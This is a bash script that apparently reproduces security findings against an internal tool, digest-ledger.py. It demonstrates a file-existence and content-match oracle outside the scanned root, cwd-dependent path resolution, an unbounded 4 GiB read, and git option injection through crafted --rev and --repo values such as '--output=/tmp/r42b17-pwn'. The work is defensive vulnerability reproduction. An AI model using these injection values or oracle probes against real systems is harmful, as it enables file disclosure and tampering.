#!/bin/bash
# R42B17 repro 2: oracle / cwd-dependence with the external file OUTSIDE the scanned root,
# plus unbounded read (P2) and git-mode option injection (P6)
S=/fast/scratch/kama-r42/seats/R42B17
export TMPDIR=$S/tmp
TOOL=$S/clone/tools/digest-ledger.py
R=$S/r2
rm -rf "$R" "$S/ext" "$S/deep" "$S/big"; mkdir -p "$R/registry" "$S/ext" "$S/deep" "$S/tmp"
run() { local label=$1 cwd=$2; shift 2
  echo "=== $label"
  ( cd "$cwd" && timeout 60 python3 "$TOOL" scan --dir "$R" "$@" >"$S/out.txt" 2>"$S/err.txt"; echo "exit=$?" )
  echo "stdout: $(cat "$S/out.txt")"; echo "stderr(head): $(head -c 300 "$S/err.txt" | tr '\n' '|')"; }

printf 'secret-value\n' > "$S/ext/secret.bin"
GOOD=$(sha256sum "$S/ext/secret.bin" | cut -d' ' -f1)
BAD=${GOOD:0:8}$(printf '0%.0s' {1..56})
echo "--- P3 existence + content-match oracle (file outside root, absolute path)"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t%s\t\t\t\n' "$GOOD" "$S/ext/secret.bin" > "$R/registry/digest-ledger.tsv"
printf '%s\n' "$GOOD" > "$R/doc.md"
run "P3-1 absolute path exists, digest matches -> external_ok" "$R"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t%s\t\t\t\n' "$BAD" "$S/ext/secret.bin" > "$R/registry/digest-ledger.tsv"
printf '%s\n' "$BAD" > "$R/doc.md"
run "P3-2 same file, wrong digest -> ledger_bad (content oracle bit)" "$R"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t%s\t\t\t\n' "$BAD" "$S/ext/nosuch.bin" > "$R/registry/digest-ledger.tsv"
run "P3-3 nonexistent path -> external_absent (existence oracle bit)" "$R"

echo "--- P4 relative path is resolved against the caller cwd, not the scanned root"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t../ext/secret.bin\t\t\t\n' "$GOOD" > "$R/registry/digest-ledger.tsv"
printf '%s\n' "$GOOD" > "$R/doc.md"
run "P4-1 cwd=$R -> ../ext/secret.bin exists -> external_ok" "$R"
run "P4-2 cwd=$S/deep (same tree, same row) -> external_absent" "$S/deep"

echo "--- P2 unbounded read: one 4 GiB sparse regular file named by a ledger row"
truncate -s 4G "$S/big/huge.bin"; ls -ls "$S/big/huge.bin"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t%s\t\t\t\n' "$BAD" "$S/big/huge.bin" > "$R/registry/digest-ledger.tsv"
echo "=== P2 with ulimit -v 1000000 (1 GB address space), 60 s cap"
( cd "$R" && ulimit -v 1000000 && timeout 60 python3 "$TOOL" scan --dir "$R" >"$S/out.txt" 2>"$S/err.txt"; echo "exit=$?" )
echo "stdout: $(cat "$S/out.txt")"; echo "stderr(tail): $(tail -c 300 "$S/err.txt" | tr '\n' '|')"

echo "--- P6 git-mode option injection through --rev / --repo"
C=$S/clone
rm -f "$S/pwn" /tmp/r42b17-pwn
for REV in '--output=/tmp/r42b17-pwn' '--all' '-q' '--git-dir=/tmp' 'HEAD:--output=/tmp/r42b17-pwn' '@{-1}' '--'; do
  ( cd "$C" && timeout 60 python3 "$TOOL" scan --repo "$C" --rev "$REV" >"$S/out.txt" 2>"$S/err.txt"; echo "rev=[$REV] exit=$? stdout=[$(head -c 120 "$S/out.txt")] stderr=[$(head -c 160 "$S/err.txt" | tr '\n' '|')]" )
done
ls -l /tmp/r42b17-pwn 2>&1 | head -2
for REPO in '--output=/tmp/r42b17-pwn' '-c' '/etc'; do
  ( cd "$C" && timeout 60 python3 "$TOOL" scan --repo "$REPO" --rev HEAD >"$S/out.txt" 2>"$S/err.txt"; echo "repo=[$REPO] exit=$? stdout=[$(head -c 120 "$S/out.txt")] stderr=[$(head -c 160 "$S/err.txt" | tr '\n' '|')]" )
done
ls -l /tmp/r42b17-pwn 2>&1 | head -2
echo "--- P6b rev that is a path/refs trick: does rev-parse touch the worktree?"
( cd "$C" && git status --porcelain | head -3; echo "status_exit=$?" )
